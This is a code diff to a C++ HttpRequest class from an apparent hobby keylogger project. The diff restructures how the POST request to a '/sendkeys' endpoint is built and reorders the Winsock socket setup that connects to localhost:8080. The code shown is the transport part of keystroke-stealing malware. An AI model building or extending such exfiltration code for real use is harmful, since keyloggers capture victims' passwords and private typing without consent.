@@ -248,7 +248,10 @@ void HttpRequest::buildRequest()
     // Here we build the request headers and attach the body of the request.
     // NOTE: Apparently you cant just use newline characters when building the request and have to use \r along with \n for it to format
     // correctly and be portable.
-    reqString.append("POST /sendkeys HTTP/1.1\r\n"); // Here we define the method, the url, and which http version we are using.
+    reqString.append(getMethod()); // Adding the HTTP Method to the Request (POST)
+    reqString.append(" ");
+    reqString.append(getUrl()); // Adding the /sendkeys endpoint to the header.
+    reqString.append(" HTTP/1.1\r\n"); // Adding the HTTP version to the header.
     reqString.append("Host: localhost:8080\r\n"); // Here we provide the address of the host we are sending data to.
     reqString.append("Content-Type: application/json\r\n"); // Here we define the type of content being sent to the server.
     reqString.append("content-length: " + std::to_string(reqBody.length())); // Here we define the length of the request body.
@@ -288,15 +291,6 @@ void HttpRequest::sendRequest()
     {
         //If we successfully start winsock, we can try and send the data.
 
-        //Structure for holding all of our socket information.
-        SOCKADDR_IN socketConfig;
-
-        socketConfig.sin_addr.s_addr = inet_addr("127.0.0.1"); // Here we set the IP address we want to connect to.
-        socketConfig.sin_family = AF_INET;  // Here we define the addressing family we want to use.
-        socketConfig.sin_port = htons(8080); // Here we define the port we want to connect over.
-
-        std::cout << "Socket Configured." << std::endl;
-
         SOCKET keyloggerSocket; // Defining our socket for the keylogger.
 
         // Here we attempt to initialize the socket using a addressing family, a socket type, and 
@@ -309,6 +303,15 @@ void HttpRequest::sendRequest()
         {
             std::cout << "Successfully created socket" << std::endl;
         }
+
+        //Structure for holding all of our socket information.
+        SOCKADDR_IN socketConfig;
+
+        socketConfig.sin_addr.s_addr = inet_addr("127.0.0.1"); // Here we set the IP address we want to connect to.
+        socketConfig.sin_family = AF_INET;  // Here we define the addressing family we want to use.
+        socketConfig.sin_port = htons(8080); // Here we define the port we want to connect over.
+
+        std::cout << "Socket Configured." << std::endl;
 
         std::cout << "connecting to server.." << std::endl;
 
